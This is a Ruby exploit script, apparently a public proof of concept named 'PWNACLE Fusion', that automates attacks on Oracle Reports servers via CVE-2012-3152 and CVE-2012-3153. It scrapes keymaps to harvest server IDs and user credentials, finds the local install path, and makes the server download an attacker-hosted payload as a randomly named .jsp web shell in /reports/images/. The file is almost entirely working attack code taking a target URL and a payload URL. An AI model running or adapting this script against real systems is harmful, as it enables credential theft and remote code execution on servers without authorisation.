#!/usr/bin/env ruby

require 'uri'
require 'open-uri'
require 'openssl'
#OpenSSL::SSL::VERIFY_PEER = OpenSSL::SSL::VERIFY_NONE

def upload_payload(dest)
  url = "#{@url}/reports/rwservlet?report=test.rdf+desformat=html+destype=file+desname=/#{dest}/images/#{@payload_name}+JOBTYPE=rwurl+URLPARAMETER='#{@payload_url}'"
  #print url 
  begin
  uri = URI.parse(url)
  html = uri.open.read
  rescue
    html = ""
  end
  
  if html =~ /Successfully run/
    @hacked = true
    print "[+] Payload uploaded!\n"
  else
    print "[-] Payload uploaded failed\n"
  end
end

def getenv(server, authid)
  print "[+] Found server: #{server}\n"
  print "[+] Found credentials: #{authid}\n"
  print "[*] Querying showenv ... \n"
  begin
    uri = URI.parse("#{@url}/reports/rwservlet/showenv?server=#{server}&authid=#{authid}")
    html = uri.open.read
  rescue
    html = ""
  end

  if html =~ /\/(.*)\/showenv/ 
    print "[+] Query succeeded, uploading payload ... \n"
    upload_payload($1)
  else
    print "[-] Query failed... \n"
  end
end

@payload_url = ""         #the url that holds our payload (we can execute .jsp on the server)
@url = ""                 #url to compromise
@hacked = false
@payload_name = (0...8).map { ('a'..'z').to_a[rand(26)] }.join + ".jsp" 

print "[*] PWNACLE Fusion - Mekanismen <mattias@gotroot.eu>\n"
print "[*] Automated exploit for CVE-2012-3152 / CVE-2012-3153\n"
print "[*] Credits to: @miss_sudo\n"

unless ARGV[0] and ARGV[1]
  print "[-] Usage: ./pwnacle.rb target_url payload_url\n"
  exit
end

@url =  ARGV[0]
@payload_url =  ARGV[1]
print "[*] Target URL: #{@url}\n"
print "[*] Payload URL: #{@payload_url}\n"
print "[*] Payload name: #{@payload_name}\n"

begin
#Can we view keymaps?
uri = URI.parse("#{@url}/reports/rwservlet/showmap")
html = uri.open.read
rescue
  print "[-] URL not vulnerable or unreachable\n"
  exit
end

test = html.scan(/<SPAN class=OraInstructionText>(.*)<\/SPAN><\/TD>/).flatten

#Parse keymaps for servers
print "[*] Enumerating keymaps ... \n"
test.each do |t|
  if not @hacked
    t = t.delete(' ')
    url = "#{@url}/reports/rwservlet/parsequery?#{t}"

  begin
    uri = URI.parse(url)
    html = uri.open.read
    rescue
  end
  
  #to automate exploitation we need to query showenv for a local path
  #we need a server id and creds for this, we enumerate the keymaps and hope for the best
  #showenv tells us the local PATH of /reports/ where we upload the shell
  #so we can reach it from /reports/images/<shell>.jsp 

  if html =~ /userid=(.*)@/
    authid = $1
  end
  if html =~ /server=(\S*)/ 
    server = $1
  end

  if server and authid
    getenv(server, authid)
  end
  else
    break
  end
end

if @hacked
  print "[*] Server hopefully compromised!\n"
  print "[*] Payload url: #{@url}/reports/images/#{@payload_name}\n"
else
  print "[*] Enumeration done ... no vulnerable keymaps for automatic explotation found :(\n"
  #server is still vulnerable but cannot be automatically exploited ... i guess
end
